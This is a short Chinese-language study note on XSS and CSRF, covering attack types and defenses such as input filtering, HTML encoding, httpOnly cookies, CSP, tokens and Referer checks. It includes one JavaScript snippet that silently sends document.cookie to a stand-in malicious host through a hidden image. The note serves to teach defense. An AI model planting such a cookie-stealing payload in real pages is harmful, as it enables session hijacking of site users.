# 安全

## XSS 和 CSRF 防御

XSS 和 CSRF 都属于跨站攻击，XSS 是实现 CSRF 诸多途径中的一条，但不是唯一一条

xss 的本质是让对方浏览器执行你插入的 js ，来获取 cookie 等信息；csrf 是借用用户的身份，向服务器发送请求

XSS 分为存储型和反射型：

- 存储型 XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种 XSS 比较危险，容易造成蠕虫，盗窃 cookie 等
- 反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码。发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS

## XSS 防范

- 1.客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的 js 代码被植入到 HTML 代码中，使得 js 代码得以执行
- 移除用户上传的 DOM 属性，如 onerror 等
- 移除用户上传的 style 节点，script 节点，iframe 节点等
- 2.对用户输入的代码标签进行转换（html encode）
- 3.对 url 中的参数进行过滤
- 4.对动态输出到页面的内容进行 HTML 编码
- 5.服务端对敏感的 Cookie 设置 httpOnly 属性，使 js 脚本不能读取到 cookie
- 6.CSP 即是 Content Security Policy

```javascript
var img = document.createElement('img');
img.src='http://www.xss.com?cookie='+document.cookie;
img.style.display='none';
document.getElementsByTagName('body')[0].appendChild(img);

这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
```

目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段 xss 攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭

## 跨站请求伪造的过程与防范

[对于跨站伪造请求（CSRF）的理解和总结](http://www.imooc.com/article/13552)

过程：用户小明在你的网站 A 上面登录了，A 返回了一个 session ID（使用 cookie 存储）,小明的浏览器保持着 A 网站的登录状态，攻击者小强给小明发送了一个链接地址，小明打开了地址的时候，这个页面已经自动的对网站 a 发送了一个请求，通过使用小明的 cookie 信息，这样攻击者小强就可以随意更改小明在 A 上的信息。

1. 使用 token：服务器随机产生 tooken，然后以 tooken 为秘钥产生一段密文，把 token 和密文都随 cookie 交给前端，前端发起请求时把密文和 token 交给后端，后端对 token 和密文进行验证，看 token 能不能生成同样的密文，这样即使黑客拿到了 token 也无法拿到密文

```
http://www.weibo.cn?follow_uid=123&token=73ksdkfu102
```

2. 使用验证码：每一个重要的 post 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的
3. 检测 http 的头信息 refer。Referer 记录了请求的来源地址，服务器要做的是验证这个来源地址是否合法
4. 涉及敏感操作的请求改为 POST 请求
